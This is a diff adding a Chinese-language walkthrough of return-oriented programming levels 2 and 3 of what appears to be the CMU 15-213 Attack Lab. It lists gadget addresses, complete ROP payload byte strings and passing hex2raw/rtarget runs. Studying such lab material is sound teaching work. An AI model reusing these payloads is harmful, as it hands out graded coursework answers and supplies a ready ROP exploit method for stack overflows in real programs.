@@ -295,7 +295,196 @@ PASS: Would have posted the following:
         result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
 ```
 
+## 返回导向编程攻击
 
+返回导向编程(Return-oriented programming, ROP)是使用程序里既有的字节代码攻击程序。
+
+### level 2
+
+用ROP重新实现level 2中的任务
+
+我们需要的代码序列如下：
+
+```s
+popq %rax
+movq %rax, %rdi
+```
+
+`popq %rax`的指令字节为：`58`，所以我们找到了如下函数：
+
+```s
+00000000004019a7 <addval_219>:
+  4019a7: 8d 87 51 73 58 90     lea    -0x6fa78caf(%rdi),%eax
+  4019ad: c3 
+```
+
+从中我们可以得出`popq %rax`指令的地址为：`0x4019ab`
+
+`movq %rax, %rdi`的指令字节为：`48 89 c7`，所以我们找到了如下函数：
+
+```s
+00000000004019a0 <addval_273>:
+  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax
+  4019a6: c3  
+```
+从中我们可以得出`movq %rax, %rdi`指令的地址为：`0x4019a2`
+
+所以我们可以这样构造字节序列：
+
+```
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+a2 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+
+组织结构如下：
+
+!()[https://upload-images.jianshu.io/upload_images/1433829-45d42fcf3d5bcca4.png]
+
+```bash
+$ ./hex2raw -i solutions/lv4.txt | ./rtarget -q
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
+```
+
+### level 3
+
+在这一阶段中，我们需要做的就是把字符串的起始地址，传送到`%rdi`,然后调用`touch3`函数。
+
+因为每次栈的位置是随机的，所以无法直接用地址来索引字符串的起始地址，只能用**栈顶地址 + 偏移量来索引字符串的起始地址**。从farm中我们可以获取到这样一个`gadget`：`lea (%rdi,%rsi,1),%rax`，这样就可以把字符串的首地址传送到`%rax`。
+
+解题思路：
+
+（1）首先获取到`%rsp`的地址，并且传送到`%rdi`
+（2）其二获取到字符串的偏移量值，并且传送到`%rsi`
+（3）`lea (%rdi,%rsi,1),%rax`, 将字符串的首地址传送到`%rax`, 再传送到`%rdi`
+（4）调用touch3函数
+
+#### 获取到%rsp的地址
+
+```s
+0000000000401a03 <addval_190>:
+  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax
+  401a09: c3  
+```
+
+`movq %rsp, %rax`的指令字节为：`48 89 e0`, 所以这一步的gadget地址为：`0x401a06`
+
+#### 将%rax的内容传送到%rdi
+
+```s
+00000000004019a0 <addval_273>:
+  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax
+  4019a6: c3
+```
+
+`movq %rax, %rdi`的指令字节为：`48 89 c7`，所以这一步的gadget地址为：`0x4019a2`
+
+#### 将偏移量的内容弹出到`%rax`
+
+```s
+00000000004019ca <getval_280>:
+  4019ca: b8 29 58 90 c3        mov    $0xc3905829,%eax
+  4019cf: c3   
+```
+`popq %rax`的指令字节为：58， 其中90为`nop`指令, 所以这一步的gadget地址为：`0x4019cc`
+
+#### 将`%eax`的内容传送到`%edx`
+
+```s
+00000000004019db <getval_481>:
+  4019db: b8 5c 89 c2 90        mov    $0x90c2895c,%eax
+  4019e0: c3    
+`movl %eax, %edx`的指令字节为:`89 c2`, 所以这一步的gadget地址为：`0x4019dd`
+```
+
+#### 将`%edx`的内容传送到`%ecx`
+
+```s
+0000000000401a6e <setval_167>:
+  401a6e: c7 07 89 d1 91 c3     movl   $0xc391d189,(%rdi)
+  401a74: c3  
+```
+
+`movl %edx, %ecx`的指令字节为：`89 d1`，所以这一步的gadget地址为：`0x401a70`
+
+#### 将`%ecx`的内容传送到`%esi`
+
+```s
+0000000000401a11 <addval_436>:
+  401a11: 8d 87 89 ce 90 90     lea    -0x6f6f3177(%rdi),%eax
+  401a17: c3                    retq 
+```
+`movl %ecx, %esi`的指令字节为：`89 ce`, 所以这一步gadget地址为：`0x401a13`
+
+#### 将栈顶 + 偏移量得到字符串的首地址传送到`%rax`
+
+```s
+00000000004019d6 <add_xy>:
+  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax
+  4019da: c3                    retq 
+```
+
+这一步的gadget地址为：`0x4019d6`
+
+#### 将字符串首地址`%rax`传送到`%rdi`
+
+```s
+00000000004019a0 <addval_273>:
+  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax
+  4019a6: c3
+```
+
+`movq %rax, %rdi`的指令字节为：`48 89 c7`，所以这一步的gadget地址为：`0x4019a2`
+
+栈的结构如下：
+
+![](https://upload-images.jianshu.io/upload_images/1433829-cafcf76d35ef7ba1.png)
+
+综上所述，我们可以得到字符串首地址和返回地址之前隔了9条指令，所以偏移量为72个字节，也就是0x48，可以的到如下字符序列如下：
+
+```
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00 
+a2 19 40 00 00 00 00 00 
+cc 19 40 00 00 00 00 00 
+48 00 00 00 00 00 00 00 
+dd 19 40 00 00 00 00 00 
+70 1a 40 00 00 00 00 00 
+13 1a 40 00 00 00 00 00 
+d6 19 40 00 00 00 00 00 
+a2 19 40 00 00 00 00 00 
+fa 18 40 00 00 00 00 00 
+35 39 62 39 39 37 66 61 00
+```
+
+结果验证
+
+```bash
+$ ./hex2raw -i solutions/lv5.txt | ./rtarget -q
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
+```
 
 ## reference
 
